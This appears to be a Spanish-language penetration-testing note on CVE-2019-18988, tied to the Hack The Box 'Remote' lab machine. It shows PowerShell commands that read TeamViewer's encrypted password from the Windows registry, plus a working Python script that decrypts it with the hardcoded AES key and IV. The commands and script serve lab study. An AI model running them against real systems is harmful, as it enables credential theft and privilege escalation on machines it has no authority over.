
## DESCRIPTION

CVE: **CVE-2019-18988

TeamViewer stored user passwords encrypted with AES-128-CBC with they key of `0602000000a400005253413100040000` and iv of `0100010067244F436E6762F25EA8D704` in the Windows registry. If the password is reused anywhere, privilege escalation is possible.

Es posible obtener la contraseña del usuario que lo instala.

ENUMERACIÓN

```
#Por ejemplo encontramos que se está utilizando o que esta insalado TeamViewer
tasklist

#Si accedemos a la ruta podemos comprobar la versión
C:\Program Files (x86)\TeamViewer> ls
```

![[Pasted image 20230228204130.png]]

#### Mas información
* https://0xdf.gitlab.io/2020/09/05/htb-remote.html#priv-iis--administrator
* https://whynotsecurity.com/blog/teamviewer/

## EXPLOITATION

1. Accedemos al registro de teamviewer

```
cd HKLM:\software\wow6432node\teamviewer\version7
```

2. Vemos los campos del registro

```
get-itemproperty -path .
```

![[Pasted image 20230228204349.png]]
3. SecurityPasswordAES es la contraseña que tenemos que desencriptar. La obtenemos:

```
(get-itemproperty -path .).SecurityPasswordAES
```

![[Pasted image 20230228204745.png]]

4. Script que lo desencripta:

```
#!/usr/bin/env python3 
from Crypto.Cipher import AES 
key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"

#en la siguiente variable introducimos la password encontrada en el paso anterior
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91]) 

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")

print(f"[+] Found password: {password}")
```

![[Pasted image 20230228204650.png]]
5. Con estas credenciales prueba a conectarte por Evil-WinRM o psexec.

## MACHINES

* Hack The Box: Remote
